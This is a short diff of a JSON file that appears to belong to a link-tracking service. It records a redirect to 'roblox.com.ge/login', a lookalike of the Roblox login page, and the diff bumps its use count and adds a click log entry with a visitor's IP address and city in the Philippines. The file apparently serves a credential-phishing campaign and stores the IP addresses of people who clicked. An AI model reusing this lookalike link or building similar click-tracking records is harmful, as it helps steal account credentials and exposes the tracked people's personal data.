@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1284,
+    "useCount": 1285,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10414,6 +10414,14 @@
         "ip": "165.101.14.254",
         "country": "Philippines",
         "city": "Santa Teresa First",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777368318364,
+        "ip": "112.207.106.223",
+        "country": "Philippines",
+        "city": "Paranaque City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
